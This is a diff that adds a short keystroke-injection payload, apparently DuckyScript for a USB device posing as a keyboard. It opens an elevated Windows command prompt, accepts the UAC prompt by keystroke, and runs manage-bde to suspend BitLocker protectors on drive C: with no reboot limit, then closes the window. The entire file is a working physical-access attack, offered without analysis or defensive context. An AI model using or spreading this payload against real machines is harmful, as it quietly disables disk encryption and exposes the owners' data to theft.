@@ -1,0 +1,13 @@
+REM launch command prompt as admin as fast as possible
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 3000
+ALT y
+DELAY 500
+
+STRING manage-bde -protectors -Disable C: -RebootCount 0
+ENTER
+DELAY 500
+ALT F4
